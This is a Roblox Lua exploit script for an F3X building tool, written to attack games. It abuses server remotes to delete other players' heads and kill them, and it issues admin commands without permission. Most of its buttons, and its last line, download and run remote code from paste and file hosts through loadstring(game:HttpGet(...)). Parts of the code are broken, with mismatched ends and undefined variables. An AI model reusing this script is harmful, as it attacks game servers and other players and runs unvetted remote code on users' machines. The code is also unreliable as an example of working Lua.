--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--


--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--


--[ Make sure your device is not a potato to run the maps properly ]--

--[ Printing (Very useless)]--
remote = tool.SyncAPI.ServerEndpoint
function _(args)
    remote:InvokeServer(unpack(args))
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification

local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()


local arm = character:FindFirstChild("Right Arm")
local humanoid = character:FindFirstChildOfClass("Humanoid")


local isDead = false

humanoid.Died:Connect(function()
	isDead = true
end)


local animator = humanoid:FindFirstChildOfClass("Animator")

local attackAnim = Instance.new("Animation")
attackAnim.AnimationId = "rbxassetid://110361063508944"
local attackTrack = animator:LoadAnimation(attackAnim)
attackTrack.Priority = Enum.AnimationPriority.Action


function KillTarget(target)
    if target and target.Character then
        local head = target.Character:FindFirstChild("Head")
        if head then
            local args = {
                [1] = "SetLocked",
                [2] = {
                    [1] = head
                },

                [3] = false
            }
            remote:InvokeServer(unpack(args))
            task.wait(0.1) 
            local args2 = {
                [1] = "Remove",
                [2] = {
                    [1] = head
                }
            }
            remote:InvokeServer(unpack(args2))
        end
    end
end


local function attack()
    attackTrack:Play() 
    local hitPlayer = nil
    local touchedConnection

    local function onTouch(other)
        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
        if otherPlayer and otherPlayer ~= player then
            hitPlayer = otherPlayer
        end
    end

    touchedConnection = arm.Touched:Connect(onTouch)
    task.wait(0.5)
    if touchedConnection then
        touchedConnection:Disconnect()
    end
    if hitPlayer then
               RequestCommand:InvokeServer(" ")
        KillTarget(hitPlayer)
        wait(1)
        
    end

end

UserInputService.TouchStarted:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if isDead then return end 
    attack()
end)
end)
 
local Deku = Instance.new("TextButton")
Deku.Size = UDim2.new(0.9, 19, 0.0, 25)
Deku.Position = UDim2.new(0.0, 0, 0.0, 29)
Deku.BackgroundColor3 = Color3.new(1, 1, 1)
Deku.BorderColor3 = Color3.new(0, 0, 0)
Deku.BorderSizePixel = 0
Deku.Text = "Goner"
Deku.BackgroundTransparency = 0.3
Deku.TextColor3 = Color3.new(0, 0, 0)
Deku.Font = Enum.Font.Montserrat
Deku.Parent = Scr
Deku.TextSize = 19
Deku.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/lr7247.txt"))()
end)
 
local KJ = Instance.new("TextButton")
KJ.Size = UDim2.new(0.9, 19, 0.0, 25)
KJ.Position = UDim2.new(0.0, 0, 0.0, 58)
KJ.BackgroundColor3 = Color3.new(1, 1, 1)
KJ.BorderColor3 = Color3.new(0, 0, 0)
KJ.BorderSizePixel = 0
KJ.Text = "Primadon"
KJ.BackgroundTransparency = 0.3
KJ.TextColor3 = Color3.new(0, 0, 0)
KJ.Font = Enum.Font.Montserrat
KJ.Parent = Scr
KJ.TextSize = 19
KJ.MouseButton1Click:Connect(function()
rq:InvokeServer(";r15")
wait(1)
rq:InvokeServer(";removeaccessories")
wait(1)
rq:InvokeServer(";bundle me 38499587027735")
wait(1)
rq:InvokeServer(";size me 10")
loadstring(game:HttpGet("https://files.catbox.moe/8fmn5s.txt"))()
rq:InvokeServer(";speed me 30")
loadstring(game:HttpGet("https://files.catbox.moe/dyphvq.txt"))()
wait(1)
rq:InvokeServer(";hat me 65523893")
end)
 
local Minos = Instance.new("TextButton")
Minos.Size = UDim2.new(0.9, 19, 0.0, 25)
Minos.Position = UDim2.new(0.0, 0, 0.0, 88)
Minos.BackgroundColor3 = Color3.new(1, 1, 1)
Minos.BorderColor3 = Color3.new(0, 0, 0)
Minos.BorderSizePixel = 0
Minos.Text = "McDonalds"
Minos.BackgroundTransparency = 0.3
Minos.TextColor3 = Color3.new(0, 0, 0) 
Minos.Font = Enum.Font.Montserrat
Minos.Parent = Scr
Minos.TextSize = 19
Minos.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/s5dHfkXX/raw"))()
end)
 
local Jojo1 = Instance.new("TextButton")
Jojo1.Size = UDim2.new(0.9, 19, 0.0, 25)
Jojo1.Position = UDim2.new(0.0, 0, 0.0, 118)
Jojo1.BackgroundColor3 = Color3.new(1, 1, 1)
Jojo1.BorderColor3 = Color3.new(0, 0, 0)
Jojo1.BorderSizePixel = 0
Jojo1.Text = "Burger King"
Jojo1.BackgroundTransparency = 0.3
Jojo1.TextColor3 = Color3.new(0, 0, 0)
Jojo1.Font = Enum.Font.Montserrat
Jojo1.Parent = Scr
Jojo1.TextSize = 19
Jojo1.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/a0nYgEIl/raw"))()
end)
 
local Cashx = Instance.new("TextButton")
Cashx.Size = UDim2.new(0.9, 19, 0.0, 25)
Cashx.Position = UDim2.new(0.0, 0, 0.0, 148)
Cashx.BackgroundColor3 = Color3.new(1, 1, 1)
Cashx.BorderColor3 = Color3.new(0, 0, 0)
Cashx.BorderSizePixel = 0
Cashx.Text = "Thomas"
Cashx.BackgroundTransparency = 0.3
Cashx.TextColor3 = Color3.new(0, 0, 0)
Cashx.Font = Enum.Font.Montserrat
Cashx.Parent = Scr
Cashx.TextSize = 19
Cashx.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/jDpU45cz"))()
end)

local Gojo = Instance.new("TextButton")
Gojo.Size = UDim2.new(0.9, 19, 0.0, 25)
Gojo.Position = UDim2.new(0.0, 0, 0.0, 178)
Gojo.BackgroundColor3 = Color3.new(1, 1, 1)
Gojo.BorderColor3 = Color3.new(0, 0, 0)
Gojo.BorderSizePixel = 0
Gojo.Text = "John doe"
Gojo.BackgroundTransparency = 0.3
Gojo.TextColor3 = Color3.new(0, 0, 0)
Gojo.Font = Enum.Font.Montserrat
Gojo.Parent = Scr
Gojo.TextSize = 19
Gojo.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
    local char = player.Character
    local tool
    for i,v in player:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
    for i,v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
   
    remote = tool.SyncAPI.ServerEndpoint
    function _(args)
        remote:InvokeServer(unpack(args))
    end


local function Color(part, color)
	local args = {
		"SyncColor",
		{
			{
				Part = part,
				Color = color,
				UnionColoring = false
			}
		}
	}
	_(args)
end

local function applyDecorationToPart(part) 
    
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 3,
                ["Heat"] = 25,
                ["Color"] = Color3.fromRGB(255, 0, 0), 
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
            } 
        } 
    }

    
    _(argsCreate)
    _(argsSync)
end

local function Parter(part) 
    
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Smoke"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Smoke",
                ["Size"] = 3,
                ["Color"] = Color3.fromRGB(255, 0, 0),  
            } 
        } 
    }

    
    _(argsCreate)
    _(argsSync)
end
local function eyePart(part) 
    
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 1,
                ["Heat"] = 12,
                ["Color"] = Color3.fromRGB(155, 0, 0), 
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
            } 
        } 
    }

    
    _(argsCreate)
    _(argsSync)
end



local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification




local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

    
RequestCommand:InvokeServer(";removeaccessories")
RequestCommand:InvokeServer(";titlebk me John Doe")

wait(1)
RequestCommand:InvokeServer(";hat me 107676946962151")
wait(0.5)
RequestCommand:InvokeServer(";hat me 18196403126")
wait(0.5)
RequestCommand:InvokeServer(";hat me 18801497637")
wait(0.5)
 RequestCommand:InvokeServer(";shirt me 100276101149100")
 RequestCommand:InvokeServer(";pants me 109662040845019")
RequestCommand:InvokeServer(";head me 0")
RequestCommand:InvokeServer(";face me 144075659")


wait(1)

local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
local arm = char:FindFirstChild("Right Arm")
local tor = char:FindFirstChild("Torso")
local ar2 = char:FindFirstChild("Left Arm")

local RLeg = char:FindFirstChild("Right Leg")
local head = char:FindFirstChild("Head")
local LLeg = char:FindFirstChild("Left Leg")
applyDecorationToPart(arm)
applyDecorationToPart(ar2)
eyePart(eye)
Parter(tor)

Color(arm, Color3.fromRGB(252, 255, 150))
Color(ar2, Color3.fromRGB(252, 255, 150))
Color(head, Color3.fromRGB(252, 255, 150))
Color(tor, Color3.fromRGB(255, 255, 0))
Color(RLeg, Color3.fromRGB(0, 200, 255))
Color(LLeg, Color3.fromRGB(0, 200, 255))



local arm = character:FindFirstChild("Right Arm") 
local humanoid = character:FindFirstChildOfClass("Humanoid")


local isDead = false

humanoid.Died:Connect(function()
	isDead = true
end)


local animator = humanoid:FindFirstChildOfClass("Animator")

local attackAnim = Instance.new("Animation")
attackAnim.AnimationId = "rbxassetid://186934658"
local attackTrack = animator:LoadAnimation(attackAnim)

function KillTarget(target)
    if target and target.Character then
        local head = target.Character:FindFirstChild("Head")
        if head then
            local args = {
                [1] = "SetLocked",
                [2] = {
                    [1] = head
                },

                [3] = false
            }
            remote:InvokeServer(unpack(args))
            task.wait(0.1) 
            local args2 = {
                [1] = "Remove",
                [2] = {
                    [1] = head
                }
            }
            remote:InvokeServer(unpack(args2))
        end
    end
end


local function attack()
    attackTrack:Play() 
    local hitPlayer = nil
    local touchedConnection

    local function onTouch(other)
        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
        if otherPlayer and otherPlayer ~= player then
            hitPlayer = otherPlayer
        end
    end

    touchedConnection = arm.Touched:Connect(onTouch)
    task.wait(0.5)
    if touchedConnection then
        touchedConnection:Disconnect()
    end
    if hitPlayer then
               RequestCommand:InvokeServer(" ")
  
KillTarget(hitPlayer)
        task.wait(1)
        
    end

end


local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "AttackButtonGui"

local attackButton = Instance.new("TextButton")
attackButton.Name = "AttackButton"
attackButton.Parent = screenGui
attackButton.Size = UDim2.new(0, 160, 0, 50)
attackButton.Position = UDim2.new(0.5, -80, 1, -90)
attackButton.AnchorPoint = Vector2.new(0.5, 0)
attackButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
attackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
attackButton.Font = Enum.Font.GothamBold
attackButton.Text = "attack"
attackButton.TextSize = 22
attackButton.AutoButtonColor = true
attackButton.ZIndex = 999


attackButton.MouseButton1Click:Connect(function()
	if not isDead then
		attack()
	end
end)



loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/ac3768adf302d0b28e71fc89ab46dcd4/raw/6ad0f8cc313a5541f884768c7f75abd62aee377e/John%2520Doe%2520Trial"))()

end)

local sec = Instance.new("TextBox")
sec.Size = UDim2.new(0.3, 7, 0.0, 25)
sec.Position = UDim2.new(0.0, 332, 0.0, 45)
sec.BackgroundColor3 = Color3.new(1, 1, 1)
sec.BorderColor3 = Color3.new(0, 0, 0)
sec.BorderSizePixel = 0
sec.Text = ""
sec.TextColor3 = Color3.new(0, 0, 0)
sec.BackgroundTransparency = 0.3
sec.Font = Enum.Font.Montserrat
sec.TextSize = 15
sec.Parent = Image
sec.PlaceholderText = "search"
sec.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
sec.TextSize = 21
 
local command = Instance.new("TextBox")
command.Size = UDim2.new(0.3, 29, 0.1, 0)
command.Position = UDim2.new(0.5, 64, 0.0, 266)
command.BackgroundColor3 = Color3.new(1, 1, 1)
command.BorderColor3 = Color3.new(0, 0, 0)
command.BorderSizePixel = 0
command.Text = ""
command.TextColor3 = Color3.new(0, 0, 0)
command.BackgroundTransparency = 0.3
command.Font = Enum.Font.Code
command.TextSize = 15
command.Parent = Image
command.PlaceholderText = "command bar"
command.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
command.TextSize = 21
 
local lel = Instance.new("ImageLabel")
lel.Size = UDim2.new(0.0, 108, 0.0, 108)
lel.Position = UDim2.new(-0.127000004, 0, 0.407999992, 0)
lel.BackgroundColor3 = Color3.new(0, 0, 0)
lel.ImageColor3 = Color3.new(1, 1, 1)
lel.Image = "rbxassetid://146470272"
lel.ImageTransparency = 0
lel.Parent = gui
 
lel.BackgroundTransparency = 1 
 
local Ring = Instance.new("ImageLabel")
Ring.Size = UDim2.new(1.0, 0, 1.0, 0)
Ring.Position = UDim2.new(0.0, 0, 0.0, 0)
Ring.BackgroundColor3 = Color3.new(0, 0, 0)
Ring.ImageColor3 = Color3.new(1, 1, 1)
Ring.Image = "rbxassetid://7102118272"
Ring.ImageTransparency = 0
Ring.Parent = lel
 
Ring.BackgroundTransparency = 1
 
local Orbit = Instance.new("ImageLabel")
Orbit.Size = UDim2.new(0.0, 21, 0.0, 21)
Orbit.Position = UDim2.new(0.0, 0, 0.0, 10)
Orbit.BackgroundColor3 = Color3.new(0, 0, 0)
Orbit.ImageColor3 = Color3.new(1, 1, 1)
Orbit.Image = "rbxassetid://15654878092"
Orbit.ImageTransparency = 0
Orbit.Parent = Ring
 
Orbit.BackgroundTransparency = 1
 
lel:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
wait(3)
lel:TweenPosition(UDim2.new(0.0, 9, 0.0, 190), "Out", "Sine", 0.7, false)
 
while wait() do
Ring.Rotation = Ring.Rotation + 1
Orbit.Rotation = Orbit.Rotation - 1
end
end)

--[ Hold thingy I forgot to add at first ]--

loadstring(game:HttpGet("https://files.catbox.moe/g89ms0.txt"))()
